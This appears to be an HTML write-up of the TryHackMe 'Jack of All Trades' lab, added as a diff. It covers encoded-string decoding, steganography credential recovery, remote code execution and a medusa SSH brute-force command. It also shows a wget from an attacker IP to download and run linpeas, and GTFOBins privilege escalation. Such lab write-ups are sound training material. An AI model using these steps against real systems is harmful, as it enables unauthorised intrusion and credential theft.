@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TryHackMe: Jack of All Trades Writeup</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px auto;
+            max-width: 800px;
+            line-height: 1.6;
+            color: #333;
+        }
+        h1, h2 {
+            color: #2c3e50;
+        }
+        a {
+            color: #0073e6;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .back-link {
+            display: inline-block;
+            margin-top: 30px;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 2px 4px;
+            border-radius: 4px;
+        }
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+
+<h1>TryHackMe: Jack of All Trades Writeup</h1>
+<p><strong>Room Link:</strong> <a href="https://tryhackme.com/room/jackofalltrades" target="_blank">https://tryhackme.com/room/jackofalltrades</a></p>
+    <p>All-in-One is a simple room designed for beginners. There are multiple exploitations you can use to help you find the flags.</p>
+
+    <h2>Techniques Used</h2>
+    <ul>
+        <li>Cryptography</li>
+        <li>Remote Code execution</li>
+        <li>Privilege escalation via GTFOBins</li>
+    </ul>
+
+    <h2>Tools Used</h2>
+    <ul>
+        <li>nmap</li>
+        <li>medusa</li>
+        <li>steghide</li>
+        <li>cyber chefs</li>
+        <li>Gtfobins</li>
+        <li>linpeas</li>
+    </ul>
+
+    <h2>USER FLAG</h2>
+<p>Lets start out with a nmap scan.<br><img src="images/jack-of-all-trades/1.png" alt="Nmap Scan"></p>
+
+<p>Looks like port 22 and 80 are open<br>
+Looks like they are running http on port 22 and ssh on port 80.<br>
+I couldn’t access the website due to some firefox issues since it's running on port 22.<br>
+On firefox go to <code>about:config</code><br>
+Accept the risk and continue</p>
+
+<p>Search for network.security.ports.banned.override<br>
+Select string and type 22<br><img src="images/jack-of-all-trades/2.png" alt="Firefox Config"></p>
+
+<p>Save it<br>
+You should now be able to go back to the website and view it.</p>
+
+<p>Seems like a normal website but let's check the source code.<br>
+Looks like there is some hidden stuff in there.<br><img src="images/jack-of-all-trades/3.png" alt="View Source"></p>
+
+<p>Note to self - If I ever get locked out I can get back in at /recovery.php!
+  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==</p>
+
+<p>Looks like that is base64. Lets decode it<br><img src="images/jack-of-all-trades/4.png" alt="Base64 Decode"></p>
+
+<p>Looks like we got a password.<br><code>u?WtKSraq</code></p>
+
+<p>I went on recovery.php and tried to log in with the username jack and the password provided but nothing.<br>
+Let's check the source code again.<br>
+Looks like there is more stuff we have to decode.<br><img src="images/jack-of-all-trades/5.png" alt="More Source"></p>
+
+<p>I believe this is base32. Lets try it<br>
+<code>echo “PASTE MUMBO JUMBO HERE” | base32 –decode</code><br><img src="images/jack-of-all-trades/6.png" alt="Base32"></p>
+
+<p>Looks like we get more stuff we have to decode. This one is hexadecimal.<br>
+<code>echo "PASTE MUMBO JUMBO HEREE" | xxd -r -p</code><br><img src="images/jack-of-all-trades/7.png" alt="Hex"></p>
+
+<p>Again we get more code<br>This is rot13. Let's use cyber chefs<br><img src="images/jack-of-all-trades/8.png" alt="ROT13"></p>
+
+<p>Ok going on the website just leads to the wikipedia page for stegosauria. I'm guessing they hid something in the picture of the dinosaur on the main site.</p>
+
+<p>Save the picture of the dinosaur<br>
+Lets use steghide to extract the information from the picture. It asks for a password so lets try the password we found earlier<br><img src="images/jack-of-all-trades/9.png" alt="Steghide Dinosaur"></p>
+
+<p>Ok now lets read creds.txt<br>:(<br><img src="images/jack-of-all-trades/10.png" alt="Creds Fail"></p>
+
+<p>Repeat the steps on the jackinthebox picture.<br>
+Ok don’t, that did not work either.<br>
+The only other picture is the header.jpg.<br>
+Repeat the steps with header.jpg<br><img src="images/jack-of-all-trades/11.png" alt="Header Steghide"></p>
+
+<p>Finally<br>Use those creds to log into the recovery page.<br><img src="images/jack-of-all-trades/12.png" alt="Login"></p>
+
+<p>Looks like we will have to do RCE<br><img src="images/jack-of-all-trades/13.png" alt="RCE"></p>
+
+<p>Looks like there is some password lists in the home directory<br>Let's read it.<br><img src="images/jack-of-all-trades/14.png" alt="Password List"></p>
+
+<p>It took me a while but it's an ssh password.</p>
+<p>Save the password inside a .txt<br>We have to crack it. Let's use medusa</p>
+
+<p>Side note when you save the jacks_password_list output, view the page source and copy it that way.<br><img src="images/jack-of-all-trades/15.png" alt="Save Password"></p>
+
+
+<p>Anyways back to medusa<br>
+<code>medusa -h **IP ADDRESS** -u jack -P **SSH PASSWORD FILE** -M ssh -n 80</code><br><img src="images/jack-of-all-trades/17.png" alt="Medusa"></p>
+
+<p>We got the password<br>Now let's log in.<br><img src="images/jack-of-all-trades/18.png" alt="SSH Login"></p>
+
+<p>Unfortunately it looks like the flag hidden in the picture. Lets use scp to get it to finally be done with the user flag.<br><img src="images/jack-of-all-trades/19.png" alt="SCP"></p>
+
+<p>Open the picture for the flag<br><img src="images/jack-of-all-trades/20.png" alt="User Flag"></p>
+
+<h2>Root Flag</h2>
+
+<p>sudo -l didn’t work so let's get linpeas on the system.</p>
+<p>If you're using the attack box then it's located in the directory in the image below. If you're using your own machine, download it:<br>
+<a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</a></p>
+
+<p>Start a python server to get it on the ssh machine:<br>
+python3 -m http.server 8000<br><img src="images/jack-of-all-trades/21.png" alt="Start Python Server"></p>
+
+<p>On the ssh machine use this:<br>
+<code>wget http://**attackboxIP**:8000/linpeas.sh</code><br><img src="images/jack-of-all-trades/22.png" alt="Wget Linpeas"></p>
+
+<p>chmod +x and then run linpeas.<br><img src="images/jack-of-all-trades/23.png" alt="Run Linpeas"></p>
+
+<p>Ok this looks good. Go on gtfobins and look up strings.<br>
+Ok this will let us read the root.txt<br><img src="images/jack-of-all-trades/24.png" alt="Root Flag"></p>
+
+<p>Done 🙂🙂🙂</p>
+
+<a href="index.html" class="back-link">&larr; Back to Writeups</a>
+
+</body>
+</html>
